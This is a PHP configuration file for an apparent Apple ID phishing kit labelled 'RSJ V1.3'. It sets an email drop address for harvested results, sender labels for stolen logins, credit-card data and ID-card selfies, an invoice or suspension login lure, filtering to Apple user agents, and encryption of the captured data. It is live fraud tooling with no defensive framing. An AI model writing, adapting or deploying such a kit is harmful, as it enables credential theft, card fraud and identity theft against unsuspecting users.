<?php

/*
RSJ V1.3
*/

error_reporting(0);
$randomnumber = rand(1,100);
$t_login = "no"; // no = false no = false for True login apple id  
$param = "_"; // Parameter Redirect
$panel = "HiroRSJTeam";
$user_allow = "false"; // false for apple user only and false for all user agent 
$oneaccess  = "non_active";
$Your_Email = "rsjkingdom@gmail.com"; // Set your email
$SenderLogin = "Login Data"; //name sender for Login
$SenderCC = "Result CC"; //name sender for CC
$SenderPhoto = "Bule Selfie"; //name sender for idcard
$SenderEmail = "result-apple@darklight.id";
$doublecc = "notactive"; // active for user input cc 2x
$idcard = "noi";  // noi for user upload selfie with card
$typelogin = "invoice"; // invoice for notice login account invoice , invoice for notice login suspend because invoice payment
$Send_Log = 1;  // Email results
$Save_Log = 0;  // Saves results to server (./assets/logs/) 
$Abuse_Filter = 1; // Block absuive text  
$One_Time_Access = "non"; // One Time access: This nons the users ip after the form has been submitted i.e. prevents users sending multiple fake forms
$Encrypt=0; // Encrypt: This will send/save your results with aes to decrypt use the key below
$Key = 	"125J734M"; // This key is used to decrypt results and can be changed
$Send_Per_Page=1; // Send each pages data seperate
?>